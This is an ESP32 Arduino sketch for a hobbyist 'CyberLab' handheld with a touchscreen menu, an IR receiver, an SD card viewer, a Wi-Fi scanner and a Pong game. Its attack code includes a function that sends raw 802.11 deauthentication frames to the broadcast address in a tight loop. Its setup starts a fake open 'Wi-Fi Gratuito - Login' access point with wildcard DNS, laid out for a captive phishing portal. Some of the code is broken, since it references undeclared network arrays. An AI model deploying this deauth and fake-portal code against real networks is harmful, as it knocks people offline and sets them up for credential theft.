/*
 * ============================================================================
 * [NEV]² - NEV-OS CyberLab v2.0 (Funcionalidades Reais)
 * -- TOUCH CORRIGIDO: leitura manual bit-bang + DESIGN LOPAKA --
 * ============================================================================
 */


#include <TFT_eSPI.h>

#include <Adafruit_GFX.h>
#include <Fonts/Picopixel.h>

#include <SPI.h>
#include <FS.h>
#include <SD.h>
#include <WiFi.h>
#include <IRremoteESP8266.h>
#include <IRrecv.h>
#include <IRutils.h>
#include "esp_wifi.h"
#include "esp_now.h"

#include <DNSServer.h>
DNSServer dnsServer;
struct Network {
  String ssid;
  int ch;
  int rssi;
  wifi_auth_mode_t enc;
  uint8_t bssid[6];
};

// --- PINOS HARDWARE ---
#define TFT_CS    5
#define TFT_DC    2
#define IR_PIN    27
#define TOUCH_CS   21
#define TOUCH_CLK  26
#define TOUCH_MISO 33
#define TOUCH_MOSI 32
#define SD_CS      15 // Use o SPI de hardware compartilhado com TFT

#define SCREEN_W 320
#define SCREEN_H 240

// --- CALIBRACAO DO TOUCH ---
#define TOUCH_MIN_X 300
#define TOUCH_MAX_X 3800
#define TOUCH_MIN_Y 300
#define TOUCH_MAX_Y 3800

TFT_eSPI tft = TFT_eSPI();
IRrecv irrecv(IR_PIN);
decode_results irResults;
// Estrutura para redes Wi-Fi
// --- ESTRUTURA PARA REDES ---

// --- ESTADO DO SISTEMA ---
enum AppState { 
  STATE_MENU, STATE_IR, STATE_WIFI_MENU, STATE_WIFI_ANALYSER, STATE_WIFI_DEAUTH_PORTAL, 
  STATE_WIFI_CONSTRUCTION, STATE_SD, STATE_GAME 
};
AppState currentState = STATE_MENU;

const int TOTAL_MENU_ITEMS = 4;
const int ITEMS_PER_PAGE = 2;
int currentSelectedIndex = 0;
int currentPage = 0;

unsigned long touchStartTime = 0;
bool isTouching = false;
bool actionHandled = false;
const unsigned long LONG_TOUCH_DELAY = 500;

// --- IR RECEIVER ---
String irLastProtocol = "Aguardando...";
String irLastValue = "---";
int irLastBits = 0;
int irSignalCount = 0;

// --- SD CARD ---
bool sdCardReady = false;
unsigned long sdCardSizeMB = 0;
unsigned long sdUsedMB = 0;
String sdFileList[8];
int sdFileCount = 0;

// --- WI-FI ---
int wifiNetworksFound = -1;
int wifiMenuSelectedIndex = 0;
int wifiAnalyserPage = 0;  // página atual do analyser (0=redes 0-2, 1=redes 3-5, etc)

// --- CYBER PONG ---
#define EXIT_BTN_X 250
#define EXIT_BTN_Y 218
#define EXIT_BTN_W 60
#define EXIT_BTN_H 18
const int PONG_FIELD_TOP = 30;
const int PONG_FIELD_LEFT = 5;
const int PONG_FIELD_RIGHT = 315;
const int PADDLE_WIDTH = 50;
const int PADDLE_HEIGHT = 6;
const int PADDLE_Y = 200;
const int PONG_FIELD_BOTTOM = PADDLE_Y + PADDLE_HEIGHT;
const int BALL_SIZE = 6;

int paddleX = 135;
float ballX = 160, ballY = 50;
float ballVX = 2.2, ballVY = 2.0;
int pongScore = 0;
int pongMisses = 0;
int prevPaddleX = -1;
float prevBallX = -1, prevBallY = -1;

// --- CORES ---
#define COLOR_BG      TFT_BLACK
#define COLOR_PRIMARY 0x07E0
#define COLOR_ACCENT  0x07FF
#define COLOR_WARN    0xFFE0
#define COLOR_DANGER  0xF800
#define COLOR_TEXT    TFT_WHITE
#define COLOR_BORDER  0x18E3

// ============================================================================
// FORWARD DECLARATIONS
// ============================================================================
void showBootIntro();
void renderMenu();
void handleTouch();
void executeNextAction();
void executeEnterAction();
void checkIRSignal();
void updateSDInfo();
void lerTouchTotalmenteIsolado(int &x, int &y, int &z);
void drawScreen_1(void);
void drawScreen_2(void);
void drawScreen_3(void);
void drawMenuSelectionHighlight();
void drawScreen_IR(void);
void drawScreen_WifiMenu(void);
void drawScreen_WifiAnalyser(void);
void drawWifiMenuHighlight();
void enterWifiMenu();
void enterWifiAnalyser();
void renderWifiAnalyserScreen();
void enterWifiConstruction();
String encTypeStr(wifi_auth_mode_t enc);
void resetPongGame();
void drawPongScore();
void drawExitButton();
void updatePongGame();
void renderCurrentView();


bool isAttacking = false;
uint8_t targetAP[6] = {0};
uint8_t targetClient[6] = {0};
// e a struct _networks se estiver usando
// ============================================================================
// SETUP & LOOP
// ============================================================================
void setup() {
  Serial.begin(115200);
  pinMode(IR_PIN, INPUT);
  pinMode(TFT_CS, OUTPUT); digitalWrite(TFT_CS, HIGH);
  
  // Touch pins
  pinMode(TOUCH_CS, OUTPUT);  digitalWrite(TOUCH_CS, HIGH);
  pinMode(TOUCH_CLK, OUTPUT);
  pinMode(TOUCH_MOSI, OUTPUT);
  pinMode(TOUCH_MISO, INPUT);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(COLOR_BG);

  irrecv.enableIRIn();

// No setup do seu módulo de Portal:
WiFi.mode(WIFI_AP);
WiFi.softAP("Wi-Fi Gratuito - Login");
dnsServer.start(53, "*", WiFi.softAPIP());
  xTaskCreate(attackTask, "Attack", 2048, NULL, 1, NULL);
  showBootIntro();
  renderMenu();

}

void loop() {
  if (currentState == STATE_GAME) {
    updatePongGame();
    delay(20);
    return;
  }

  handleTouch();

  if (currentState == STATE_IR) {
    checkIRSignal();
  }
  
}
void sendDeauth(uint8_t* apMac, uint8_t* clientMac) {
    uint8_t frame[26] = {
        0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Frame Control + Dest
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                         // Source (AP)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                         // BSSID
        0x00, 0x00, 0x07, 0x00                                      // Sequence + Reason (7 = Class 3 error)
    };
    memcpy(&frame[10], apMac, 6);
    memcpy(&frame[16], apMac, 6);
    
    // Dispara o frame
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}
void attackTask(void* parameter) {
    while(true) {
        if(isAttacking) {
            sendDeauth(targetAP, targetClient);
            vTaskDelay(50 / portTICK_PERIOD_MS); // Ciclo agressivo, mas estável
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

// ============================================================================
// LEITURA DO TOUCH (BIT-BANG)
// ============================================================================
void lerTouchTotalmenteIsolado(int &x, int &y, int &z) {
  digitalWrite(TOUCH_CS, LOW);
  uint8_t cmds[] = {0xB0, 0xD0, 0x90};
  int *res[] = {&z, &x, &y};
  for (int c = 0; c < 3; c++) {
    uint8_t cmd = cmds[c];
    for (int i = 0; i < 8; i++) {
      digitalWrite(TOUCH_MOSI, (cmd & 0x80) ? HIGH : LOW); cmd <<= 1;
      digitalWrite(TOUCH_CLK, HIGH); digitalWrite(TOUCH_CLK, LOW);
    }
    int val = 0;
    for (int i = 0; i < 12; i++) {
      digitalWrite(TOUCH_CLK, HIGH); val <<= 1; if (digitalRead(TOUCH_MISO)) val |= 1; digitalWrite(TOUCH_CLK, LOW);
    }
    *res[c] = val;
  }
  digitalWrite(TOUCH_CS, HIGH);
}

// ============================================================================
// GERENCIAMENTO DE TOQUES
// ============================================================================
void handleTouch() {
  int tx = 0, ty = 0, tz = 0;
  lerTouchTotalmenteIsolado(tx, ty, tz);

  static byte touchCounter = 0;
  bool debouncedTouch = false;

  if (tz > 400) {
    touchCounter++;
    if (touchCounter >= 2) {
      debouncedTouch = true;
      touchCounter = 2;
    }
  } else {
    touchCounter = 0;
  }

  if (debouncedTouch) {
    if (!isTouching) {
      isTouching = true;
      touchStartTime = millis();
      actionHandled = false;
    } else {
      if ((millis() - touchStartTime >= LONG_TOUCH_DELAY) && !actionHandled) {
        actionHandled = true;
        executeEnterAction();
      }
    }
  } else {
    if (isTouching) {
      unsigned long touchDuration = millis() - touchStartTime;
      isTouching = false;

      if (touchDuration > 30 && touchDuration < LONG_TOUCH_DELAY && !actionHandled) {
        executeNextAction();
      }
    }
  }
}

void executeNextAction() {
  if (currentState == STATE_MENU) {
    currentSelectedIndex++;
    if (currentSelectedIndex >= TOTAL_MENU_ITEMS) {
      currentSelectedIndex = 0;
    }
    int newPage = currentSelectedIndex / ITEMS_PER_PAGE;
    if (newPage != currentPage) {
      currentPage = newPage;
    }
    renderMenu();
  }
  else if (currentState == STATE_WIFI_MENU) {
    wifiMenuSelectedIndex++;
    if (wifiMenuSelectedIndex >= 3) wifiMenuSelectedIndex = 0;
    drawScreen_WifiMenu();
    drawWifiMenuHighlight();
  }
  else if (currentState == STATE_WIFI_ANALYSER) {
    // Toque curto = próxima página de redes
    wifiAnalyserPage++;
    int maxPages = (wifiNetworksFound + 2) / 3;  // 3 redes por página
    if (wifiAnalyserPage >= maxPages) wifiAnalyserPage = 0;  // volta pra primeira página
    renderWifiAnalyserScreen();
  }
  else if (currentState == STATE_IR) {
    irLastProtocol = "Aguardando...";
    irLastValue = "---";
    irLastBits = 0;
    renderCurrentView();
  }
}

void executeEnterAction() {
  if (currentState == STATE_MENU) {
    switch (currentSelectedIndex) {
      case 0:
        currentState = STATE_IR;
        irLastProtocol = "Aguardando...";
        irLastValue = "---";
        irLastBits = 0;
        renderCurrentView();
        break;
      case 1:
        enterWifiMenu();
        break;
      case 2:
        currentState = STATE_SD;
        updateSDInfo();
        renderCurrentView();
        break;
      case 3:
        currentState = STATE_GAME;
        resetPongGame();
        break;
    }
  }
  else if (currentState == STATE_WIFI_MENU) {
    if (wifiMenuSelectedIndex == 0) {
      enterWifiAnalyser();
    } else {
      enterWifiConstruction();
    }
  }
  else if (currentState == STATE_WIFI_ANALYSER || currentState == STATE_WIFI_CONSTRUCTION) {
    enterWifiMenu();
  }
  else {
    currentState = STATE_MENU;
    renderMenu();
  }
}

// ============================================================================
// IR RECEIVER
// ============================================================================
void checkIRSignal() {
  if (irrecv.decode(&irResults)) {
    irLastProtocol = typeToString(irResults.decode_type);
    irLastValue = resultToHexidecimal(&irResults);
    irLastBits = irResults.bits;
    irSignalCount++;
    irrecv.resume();
    renderCurrentView();
  }
}

void renderCurrentView() {
  if (currentState == STATE_IR) {
    drawScreen_IR();
  }
  else if (currentState == STATE_SD) {
    tft.fillScreen(COLOR_BG);
    tft.fillRect(0, 0, 320, 20, 0x0825);
    tft.drawLine(0, 20, 320, 20, COLOR_PRIMARY);
    tft.setTextColor(COLOR_ACCENT);
    tft.setCursor(8, 6);
    tft.print("HARDWARE & STORAGE (SD)");

    if (!sdCardReady) {
      tft.setTextColor(COLOR_DANGER);
      tft.setCursor(10, 60);
      tft.print("Cartao SD nao detectado.");
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(10, 80);
      tft.print("Verifique o modulo e o CS (GPIO 4).");
    } else {
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(10, 35);
      tft.printf("Capacidade: %lu MB", sdCardSizeMB);
      tft.setCursor(10, 55);
      tft.printf("Usado (raiz): %lu MB", sdUsedMB);

      tft.setTextColor(COLOR_PRIMARY);
      tft.setCursor(10, 80);
      tft.print("Arquivos na raiz:");

      tft.setTextColor(COLOR_TEXT);
      int yPos = 100;
      if (sdFileCount == 0) {
        tft.setCursor(20, yPos);
        tft.print("(vazio)");
      } else {
        for (int i = 0; i < sdFileCount; i++) {
          tft.setCursor(20, yPos);
          tft.print(sdFileList[i]);
          yPos += 15;
        }
      }
    }
  }
}

// ============================================================================
// SD CARD
// ============================================================================
void updateSDInfo() {
  digitalWrite(TFT_CS, HIGH);
  sdCardReady = SD.begin(SD_CS, SPI);
  digitalWrite(TFT_CS, HIGH);

  sdFileCount = 0;
  sdCardSizeMB = 0;
  sdUsedMB = 0;

  if (!sdCardReady) return;

  uint8_t cardType = SD.cardType();
  if (cardType == CARD_NONE) {
    sdCardReady = false;
    return;
  }

  sdCardSizeMB = (unsigned long)(SD.cardSize() / (1024ULL * 1024ULL));

  uint64_t usedBytes = 0;
  File root = SD.open("/");
  if (root) {
    File entry = root.openNextFile();
    while (entry) {
      if (!entry.isDirectory()) {
        usedBytes += entry.size();
        if (sdFileCount < 8) {
          sdFileList[sdFileCount] = String(entry.name());
          sdFileCount++;
        }
      }
      entry.close();
      entry = root.openNextFile();
    }
    root.close();
  }
  sdUsedMB = (unsigned long)(usedBytes / (1024ULL * 1024ULL));
}

// ============================================================================
// WI-FI
// ============================================================================
String encTypeStr(wifi_auth_mode_t enc) {
  switch (enc) {
    case WIFI_AUTH_OPEN:            return "ABERTA";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    default:                        return "?";
  }
}

void enterWifiMenu() {
  currentState = STATE_WIFI_MENU;
  wifiMenuSelectedIndex = 0;
  drawScreen_WifiMenu();
  drawWifiMenuHighlight();
}

void enterWifiAnalyser() {
  currentState = STATE_WIFI_ANALYSER;
  wifiAnalyserPage = 0;  // começa na primeira página

  tft.fillScreen(COLOR_BG);
  tft.setTextColor(COLOR_WARN);
  tft.setTextSize(1);
  tft.setCursor(10, 100);
  tft.print("Escaneando redes...");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  WiFi.scanDelete();
  wifiNetworksFound = WiFi.scanNetworks();


  // Preenche o array _networks
  for (int i = 0; i < wifiNetworksFound && i < 16; i++) {
    Network[i].ssid = WiFi.SSID(i);
    Network[i].ch   = WiFi.channel(i);
    Network[i].rssi = WiFi.RSSI(i);
    Network[i].enc  = WiFi.encryptionType(i);
  }


  renderWifiAnalyserScreen();
  
}


void renderWifiAnalyserScreen() {
  drawScreen_WifiAnalyser();

  tft.setTextColor(0xFFFF);
  tft.setTextSize(1);
  tft.setCursor(69, 46);
  if (wifiNetworksFound <= 0) {
    tft.print("Nenhuma rede encontrada");
  } else {
    tft.printf("%d redes encontradas | Pagina %d", wifiNetworksFound, wifiAnalyserPage + 1);
  }

  int ssidY[3] = {69, 113, 159};
  int chY[3]   = {86, 129, 177};

  // Calcula o índice inicial da página atual (3 redes por página)
  int startIdx = wifiAnalyserPage * 3;

  // Mostra até 3 redes a partir do índice start
  for (int i = 0; i < 3 && (startIdx + i) < wifiNetworksFound; i++) {
    int networkIdx = startIdx + i;
    
    tft.setTextColor(0xFB0A);
    tft.setCursor(55, ssidY[i]);
    String ssid = WiFi.SSID(networkIdx);
    if (ssid.length() > 18) ssid = ssid.substring(0, 18) + "..";
    tft.print(ssid);

    tft.setTextColor(0xFFFF);
    tft.setCursor(48, chY[i]);
    tft.printf("Ch:%2d %ddBm %s",
                WiFi.channel(networkIdx), WiFi.RSSI(networkIdx),
                encTypeStr(WiFi.encryptionType(networkIdx)).c_str());
  }
}

void enterWifiConstruction() {
  currentState = STATE_WIFI_CONSTRUCTION;
  tft.fillScreen(0x0); // Limpa tela
  
  // Design Fixo (Cabeçalho)
  tft.fillRect(-18, -8, 347, 270, 0x7D10); // Fundo
  tft.setTextColor(0xFFFF);
  tft.setTextSize(2);
  tft.drawString("Wi-Fi Scan", 85, 11);
  
  // Linha de contagem
  tft.setTextSize(1);
  int count = 0;
  for(int i = 0; i < 16; i++) if(_networks[i].ssid != "") count++;
  
  tft.drawString(String(count) + " Networks Found", 69, 46);
  tft.fillRect(36, 56, 260, 2, 0x6E09); // Linha divisória

  // Loop para desenhar até 3 redes na tela
  int yPos = 69; 
  for (int i = 0; i < 3; i++) {
    if (_networks[i].ssid == "") break; 

    // Desenha Nome
    tft.setTextColor(0xFB0A);
    String ssid = _networks[i].ssid;
    if(ssid.length() > 20) ssid = ssid.substring(0, 20) + "...";
    tft.drawString(ssid, 55, yPos);

    // Desenha Info (Canal)
    tft.setTextColor(0xFFFF);
    tft.drawString("Ch: " + String(_networks[i].ch), 55, yPos + 18);

    // Desenha Linha separadora
    yPos += 42;
    tft.fillRect(37, yPos, 258, 4, 0xBDF7);
    yPos += 15;
  }
}

// ============================================================================
// CYBER PONG
// ============================================================================
void drawExitButton() {
  tft.drawRect(EXIT_BTN_X, EXIT_BTN_Y, EXIT_BTN_W, EXIT_BTN_H, COLOR_DANGER);
  tft.setTextColor(COLOR_DANGER);
  tft.setCursor(EXIT_BTN_X + 6, EXIT_BTN_Y + 5);
  tft.print("SAIR");
}

void drawPongScore() {
  tft.fillRect(160, 4, 155, 18, COLOR_BG);
  tft.setTextColor(COLOR_PRIMARY);
  tft.setCursor(160, 8);
  tft.printf("PONTOS:%d  ERROS:%d", pongScore, pongMisses);
}

void resetPongGame() {
  tft.fillScreen(COLOR_BG);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(10, 10); tft.print("CYBER PONG");
  tft.drawLine(0, 25, 320, 25, COLOR_BORDER);
  tft.drawLine(0, 214, 320, 214, COLOR_BORDER);
  tft.setTextColor(0x7BCF);
  tft.setCursor(10, 224);
  tft.print("Arraste o dedo para mover a raquete");
  drawExitButton();

  paddleX = (SCREEN_W - PADDLE_WIDTH) / 2;
  ballX = SCREEN_W / 2;
  ballY = PONG_FIELD_TOP + 20;
  ballVX = 2.2;
  ballVY = 2.0;
  pongScore = 0;
  pongMisses = 0;
  prevPaddleX = -1;
  prevBallX = -1;
  prevBallY = -1;

  drawPongScore();
}

void updatePongGame() {
  int tx = 0, ty = 0, tz = 0;
  lerTouchTotalmenteIsolado(tx, ty, tz);

  if (tz > 300) {
    int screenX = map(tx, TOUCH_MIN_X, TOUCH_MAX_X, 0, SCREEN_W);
    int screenY = map(ty, TOUCH_MIN_Y, TOUCH_MAX_Y, 0, SCREEN_H);
    screenX = constrain(screenX, 0, SCREEN_W);
    screenY = constrain(screenY, 0, SCREEN_H);

    if (screenX >= EXIT_BTN_X && screenX <= EXIT_BTN_X + EXIT_BTN_W &&
        screenY >= EXIT_BTN_Y && screenY <= EXIT_BTN_Y + EXIT_BTN_H) {
      currentState = STATE_MENU;
      renderMenu();
      delay(250);
      return;
    }

    paddleX = constrain(screenX - PADDLE_WIDTH / 2, PONG_FIELD_LEFT, PONG_FIELD_RIGHT - PADDLE_WIDTH);
  }

  if (prevPaddleX >= 0) {
    tft.fillRect(prevPaddleX, PADDLE_Y, PADDLE_WIDTH, PADDLE_HEIGHT, COLOR_BG);
  }
  if (prevBallX >= 0) {
    tft.fillRect((int)prevBallX, (int)prevBallY, BALL_SIZE, BALL_SIZE, COLOR_BG);
  }

  ballX += ballVX;
  ballY += ballVY;

  if (ballX <= PONG_FIELD_LEFT || ballX + BALL_SIZE >= PONG_FIELD_RIGHT) {
    ballVX = -ballVX;
    ballX = constrain(ballX, (float)PONG_FIELD_LEFT, (float)(PONG_FIELD_RIGHT - BALL_SIZE));
  }
  if (ballY <= PONG_FIELD_TOP) {
    ballVY = -ballVY;
    ballY = PONG_FIELD_TOP;
  }

  if (ballVY > 0 && ballY + BALL_SIZE >= PADDLE_Y && ballY + BALL_SIZE <= PADDLE_Y + PADDLE_HEIGHT + 6) {
    if (ballX + BALL_SIZE >= paddleX && ballX <= paddleX + PADDLE_WIDTH) {
      float hitPos = ((ballX + BALL_SIZE / 2.0) - paddleX) / (float)PADDLE_WIDTH;
      ballVY = -abs(ballVY) * 1.03;
      ballVX += (hitPos - 0.5) * 2.5;
      ballVX = constrain(ballVX, -6.0f, 6.0f);
      ballVY = constrain(ballVY, -6.0f, -1.5f);
      pongScore++;
      drawPongScore();
    }
  }

  if (ballY > PONG_FIELD_BOTTOM) {
    pongMisses++;
    drawPongScore();
    ballX = SCREEN_W / 2;
    ballY = PONG_FIELD_TOP + 20;
    ballVX = 2.2;
    ballVY = 2.0;
  }

  tft.fillRect(paddleX, PADDLE_Y, PADDLE_WIDTH, PADDLE_HEIGHT, COLOR_PRIMARY);
  tft.fillRect((int)ballX, (int)ballY, BALL_SIZE, BALL_SIZE, COLOR_TEXT);

  prevPaddleX = paddleX;
  prevBallX = ballX;
  prevBallY = ballY;
}

// ============================================================================
// TELAS (DESIGN LOPAKA)
// ============================================================================
int ellipse_4_x = 291;

static const unsigned char PROGMEM image_BLE_beacon_bits[] = {0x0f,0x00,0x0f,0x00,0x0f,0x00,0x0f,0x00,0x0f,0x00,0x0f,0x00,0x0f,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0xff,0x00};
static const unsigned char PROGMEM image_Scanning_bits[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,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0x00,0x00};
static const unsigned char PROGMEM image_DolphinDone_bits[] = {0x00,0x00,0x00,0x00,0x00,0xff,0xf8,0x00,0x00,0x00,0x00,0x00,0x00,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0x00,0x6b};
static const unsigned char PROGMEM image_RFIDDolphinSuccess_bits[] = {0x00,0x00,0x03,0xff,0xf8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,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0x00,0x00};
static const unsigned char PROGMEM image_DolphinWait_bits[] = {0x00,0x00,0x00,0x3f,0xf0,0x00,0x00,0x00,0x00,0x00,0x01,0xc0,0x0e,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0x00,0x80};
static const unsigned char PROGMEM image_EviSmile1_bits[] = {0x30,0x03,0x00,0x60,0x01,0x80,0xe0,0x01,0xc0,0xf3,0xf3,0xc0,0xff,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0xf0,0x00};
static const unsigned char PROGMEM image_SDcardMounted_bits[] = {0xff,0xe0,0xff,0x20,0xff,0xe0,0xff,0x20,0xff,0xe0,0xff,0x20,0xff,0xe0,0xe6,0x00};
static const unsigned char PROGMEM image_FaceCharging_bits[] = {0x00,0x0c,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x0c,0x00,0x00,0x00,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0x00,0x00};
static const unsigned char PROGMEM image_MHz_bits[] = {0xf0,0x0f,0x3c,0x03,0xc0,0x00,0x00,0xf0,0x0f,0x3c,0x03,0xc0,0x00,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0xff,0xc0};
static const unsigned char PROGMEM image_passport_happy3_bits[] = {0x7f,0xff,0xff,0xff,0xff,0xf8,0xff,0xff,0xff,0xff,0xff,0xfc,0xff,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0xff,0xf8};
static const unsigned char PROGMEM image_passport_okay3_bits[] = {0x7f,0xff,0xff,0xff,0xff,0xf8,0xff,0xff,0xff,0xff,0xff,0xfc,0xff,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0xff,0xf8};

// Splash
void drawScreen_1(void) {
    tft.fillScreen(0x0);
    tft.fillRect(2, 0, 320, 242, 0x7D10);
    tft.setTextColor(0xFFDF);
    tft.setTextSize(5);
    tft.setFreeFont(&Picopixel);
    tft.drawString("Hi, [NEV]2Thi_ii", 38, 99);
    tft.fillRect(22, 91, 5, 47, 0x332B);
    tft.fillEllipse(ellipse_4_x, 28, 15, 15, 0xFFFF);
    tft.fillEllipse(43, 211, 15, 15, 0xFFFF);
    tft.fillEllipse(247, 174, 10, 10, 0xFFFF);
    tft.fillEllipse(44, 46, 10, 10, 0xFFFF);
}

// Menu pagina 1/2
void drawScreen_2(void) {
    tft.fillScreen(0x0);
    tft.fillRect(1, -2, 324, 243, 0x7D10);
    tft.setTextColor(0xFFFF);
    tft.setTextSize(4);
    tft.setFreeFont(&Picopixel);
    tft.drawString("Main Panel", 91, 21);
    tft.fillRoundRect(32, 50, 265, 170, 8, 0x53EB);
    tft.fillRect(43, 56, 14, 3, 0xC505);
    tft.fillRect(43, 61, 14, 3, 0xC505);
    tft.fillRect(43, 66, 14, 3, 0xC505);
    tft.fillRoundRect(60, 71, 219, 62, 9, 0xCD68);
    tft.fillRoundRect(60, 142, 219, 64, 9, 0xCD68);
    tft.drawBitmap(70, 83, image_BLE_beacon_bits, 28, 32, 0xFFFF);
    tft.setTextSize(3);
    tft.drawString("IR Reciver Tools", 110, 94);
    tft.setTextSize(2);
    tft.setFreeFont(NULL);
    tft.drawString("Wi-Fi Tools", 145, 177);
    tft.drawBitmap(61, 147, image_Scanning_bits, 123, 52, 0xFFFF);
    tft.setTextSize(1);
    tft.drawString("1/2", 291, 10);
}

// Menu pagina 2/2
void drawScreen_3(void) {
    tft.fillScreen(0x0);
    tft.fillRect(-18, -8, 347, 270, 0x7D10);
    tft.setTextColor(0xFFFF);
    tft.setTextSize(4);
    tft.setFreeFont(&Picopixel);
    tft.drawString("Main Panel", 91, 21);
    tft.fillRoundRect(32, 50, 265, 170, 8, 0x53EB);
    tft.fillRect(43, 66, 14, 3, 0xC505);
    tft.fillRect(43, 61, 14, 3, 0xC505);
    tft.fillRect(43, 56, 14, 3, 0xC505);
    tft.fillRoundRect(60, 71, 219, 62, 9, 0xCD68);
    tft.fillRoundRect(60, 142, 219, 64, 9, 0xCD68);
    tft.drawBitmap(63, 74, image_RFIDDolphinSuccess_bits, 108, 57, 0xFFFF);
    tft.setTextSize(1);
    tft.setFreeFont(NULL);
    tft.drawString("Operating System ", 174, 102);
    tft.drawBitmap(192, 146, image_DolphinDone_bits, 80, 58, 0xFFFF);
    tft.setTextSize(2);
    tft.drawString("Games / Others", 86, 172);
    tft.setTextSize(1);
    tft.drawString("2/2", 291, 10);
}

void drawMenuSelectionHighlight() {
  int localIndex = currentSelectedIndex - (currentPage * ITEMS_PER_PAGE);
  if (localIndex == 0) {
    tft.drawRoundRect(58, 69, 223, 66, 9, 0xFFE0);
    tft.drawRoundRect(59, 70, 221, 64, 9, 0xFFE0);
  } else {
    tft.drawRoundRect(58, 140, 223, 68, 9, 0xFFE0);
    tft.drawRoundRect(59, 141, 221, 66, 9, 0xFFE0);
  }
}

void showBootIntro() {
  drawScreen_1();
  delay(2000);
}

void renderMenu() {
  if (currentPage == 0) {
    drawScreen_2();
  } else {
    drawScreen_3();
  }
  drawMenuSelectionHighlight();
}

// IR Receiver screen
void drawScreen_IR(void) {
    tft.fillScreen(0x0);
    tft.fillRect(1, -2, 324, 243, 0x7D10);
    tft.fillRoundRect(28, 18, 265, 204, 8, 0x53EB);
    tft.drawBitmap(33, 164, image_DolphinWait_bits, 59, 54, 0xFFFF);
    tft.drawBitmap(279, 10, image_EviSmile1_bits, 18, 21, 0xFFFF);
    tft.setTextColor(0xFFFF);
    tft.setTextSize(2);
    tft.drawString("IR RECIVER ", 112, 40);
    tft.fillRoundRect(64, 69, 209, 83, 4, 0x18E3);
    tft.setTextSize(1);
    tft.drawString("PROTOCOL: ", 78, 81);
    tft.setTextColor(0x688);
    tft.drawString("HEX: ", 88, 100);
    tft.setTextColor(0xFFFF);
    tft.drawString("BITS: ", 85, 121);
    tft.drawBitmap(45, 26, image_BLE_beacon_bits, 28, 32, 0xFFFF);
    tft.drawBitmap(266, 146, image_SDcardMounted_bits, 11, 8, 0xFFFF);
    tft.drawString("Hint: put your SDcard into the case", 65, 154);

    // Render IR data
    tft.setTextColor(0xFFFF);
    tft.setCursor(140, 81);
    tft.print(irLastProtocol);
    tft.setCursor(140, 100);
    tft.print(irLastValue);
    tft.setCursor(140, 121);
    tft.print(irLastBits);
}

// Wi-Fi Menu
void drawScreen_WifiMenu(void) {
    tft.fillScreen(0x0);
    tft.fillRect(2, 0, 320, 242, 0x7D10);
    tft.fillRoundRect(28, 18, 265, 207, 8, 0x53EB);
    tft.fillRoundRect(46, 24, 219, 62, 9, 0xCD68);
    tft.drawBitmap(17, 7, image_passport_happy3_bits, 46, 49, 0xFFFF);
    tft.fillRoundRect(46, 90, 219, 62, 9, 0xCD68);
    tft.fillRoundRect(46, 158, 219, 62, 9, 0xCD68);
    tft.drawBitmap(230, 70, image_MHz_bits, 50, 22, 0xFFFF);
    tft.drawBitmap(208, 98, image_passport_okay3_bits, 46, 49, 0xFFFF);
    tft.drawBitmap(60, 176, image_FaceCharging_bits, 58, 28, 0xFFFF);
    tft.setTextColor(0xFFFF);
    tft.setTextSize(2);
    tft.drawString("Wi-Fi Analyser", 72, 47);
    tft.drawString("Wi-Fi Deauth ", 60, 106);
    tft.drawString("Portal", 104, 125);
    tft.drawString("Wi-Fi Spam", 136, 181);
}

void drawWifiMenuHighlight() {
  if (wifiMenuSelectedIndex == 0)
    tft.drawRoundRect(46, 24, 219, 62, 9, 0xFFE0);
  else if (wifiMenuSelectedIndex == 1)
    tft.drawRoundRect(46, 90, 219, 62, 9, 0xFFE0);
  else
    tft.drawRoundRect(46, 158, 219, 62, 9, 0xFFE0);
}

// Wi-Fi Analyser
void drawScreen_WifiAnalyser(void) {
    tft.fillScreen(0x0);
    tft.fillRect(-18, -8, 347, 270, 0x7D10);
    tft.setTextColor(0xFFFF);
    tft.setTextSize(2);
    tft.drawString("Wi-Fi Analyser", 82, 11);
    tft.fillRoundRect(32, 31, 265, 189, 8, 0x534C);
    tft.setTextSize(1);
 

    tft.fillRect(36, 56, 260, 2, 0x6E09);
    tft.setTextColor(0xFB0A);

    tft.fillRect(37, 100, 258, 4, 0xBDF7);

    tft.setTextColor(0xFFFF);

    tft.fillRect(37, 145, 258, 4, 0xBDF7);
    tft.setTextColor(0xFB0A);

    tft.setTextColor(0xFFFF);

    tft.fillRect(37, 190, 258, 4, 0xBDF7);
}
void drawScreen_DeauthPortal(void) {
    tft.fillScreen(0x0);
    tft.fillRect(-18, -8, 347, 270, 0x7D10); // Fundo padrão
    
    // Header
    tft.setTextColor(0xFFFF);
    tft.setTextSize(2);
    tft.drawString("Deauth Portal", 82, 11);
    
    // Painel Principal
    tft.fillRoundRect(32, 40, 265, 160, 8, 0x53EB);
    
    // Status do Ataque
    tft.setTextSize(1);
    tft.setCursor(45, 60);
    tft.print("Status: ");
    tft.setTextColor(isAttacking ? 0xF800 : 0x07E0); // Vermelho se atacando, verde se idle
    tft.print(isAttacking ? "ATIVO" : "IDLE");
    
    // Informações do Alvo
    tft.setTextColor(0xFFFF);
    tft.setCursor(45, 85);
    tft.print("Target AP: "); tft.print("Setado"); // Aqui você puxa o SSID do target
    
    // Botão de Ação
    tft.fillRoundRect(80, 140, 160, 40, 8, 0xCD68);
    tft.setTextColor(0xFFFF);
    tft.setCursor(120, 153);
    tft.print(isAttacking ? "PARAR ATAQUE" : "INICIAR ATAQUE");
}

